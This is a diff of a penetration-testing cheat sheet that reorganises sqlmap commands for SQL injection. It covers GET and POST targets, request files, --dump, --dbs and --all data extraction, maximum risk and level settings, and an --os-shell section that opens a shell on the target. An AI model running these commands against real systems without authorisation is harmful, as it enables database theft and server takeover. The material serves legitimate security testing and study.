@@ -7,61 +7,63 @@ website:
 render_with_liquid: false
 ---
 
-## GET Request
+## Basic Usage
 
 ```sh
+# GET Request
 sqlmap -u "http://10.0.0.1/?search=test"
-# -p: specify the parameter
+# GET Request (-p: specify the parameter)
 sqlmap -u "http://10.0.0.1/?category=test&item=1" -p item 
 
-# --technique=U: UNION attack
-# --delay=2: Time Delay
-sqlmap -u "http://vulnerable.com/?search=1" --cookie="token=3df28a..." --technique=U --delay=2 --dump
-```
-
-<br />
-
-## POST Request
-
-```sh
-# --dbs: List all available databases
-# --dump: Dump entries of database table
-sqlmap -u "http://10.0.0.1" --data="username=test&password=test" --dbs --dump
-
-# --all: Retrieve all
-sqlmap -u "http://10.0.0.1" --data="username=test&password=test" --all
-
-# --dbms: Set database system
-sqlmap -u "http://10.0.0.1" --data="username=test&password=test" --dbms=mysql
-
-# --risk=3 (max)
-# --level=5 (max)
-sqlmap -u "http://10.0.0.1" --data="username=test&password=test" --risk=3 --level=5 --dump
-
-# Cookie (--cookie)
-sqlmap -u "http://10.0.0.1" --cookie="value=*" --dbs --dump
-
-# Random agent (--random-agent)
-sqlmap -u "http://10.0.0.1" --data="username=test" --random-agent --dump
-
-# --headers: custom HTTP header
-sqlmap --headers="Cookie: value=1234" -u "http://10.0.0.1" --data="username=test&password=test" --dbs --dump
-```
-
-<br />
-
-## POST Request (Specify the Request File)
-
-```sh
-# request.txt
+# POST Request
+sqlmap -u "http://10.0.0.1" --data="username=test&password=test"
+# POST Request (specify the request file)
+sqlmap -r request.txt --risk=3 --level=5 --dump
+# The content of request.txt
 POST /login HTTP/1.1
 Host: 10.0.0.1
 
 {"username":"*", "password": "*"}
+```
 
-# --------------------------------------------------------
+<br />
 
-sqlmap -r request.txt --risk=3 --level=5 --dump
+## Options
+
+```sh
+# --dbs: List all available databases
+# --dump: Dump entries of database table
+sqlmap -u "http://10.0.0.1/?q=test" --dbs --dump
+
+# --dbms: Set database system
+sqlmap -u "http://10.0.0.1/?q=test" --dbms=mysql
+
+# Specify database name, table name, column name
+# -D: Database name
+# -T: Table name
+# -C: Column name
+sqlmap -u "http://10.0.0.1" -D database_name -T table_name -C column_name
+
+# --risk=3 (max)
+# --level=5 (max)
+sqlmap -u "http://10.0.0.1/?q=test" --risk=3 --level=5
+
+# --all: Retrieve all
+sqlmap -u "http://10.0.0.1/?q=test" --all
+
+# --technique=U: UNION attack
+# --delay=2: Time Delay
+sqlmap -u "http://10.0.0.1/?q=test" --technique=U --delay=2
+
+
+# --headers: custom HTTP header
+sqlmap --headers="Cookie: value=1234" -u "http://10.0.0.1/?q=test"
+
+# Random agent (--random-agent)
+sqlmap -u "http://10.0.0.1/?q=test" --random-agent
+
+# Cookie (--cookie)
+sqlmap -u "http://10.0.0.1/?q=test" --cookie="value=*"
 ```
 
 <br />
@@ -69,7 +71,6 @@ sqlmap -r request.txt --risk=3 --level=5 --dump
 ## Web Shell (--os-shell)
 
 ```sh
-
 sqlmap -u "http://10.0.0.1" --cookie="value=*" --os-shell
 
 # ------ Activate --------------------------
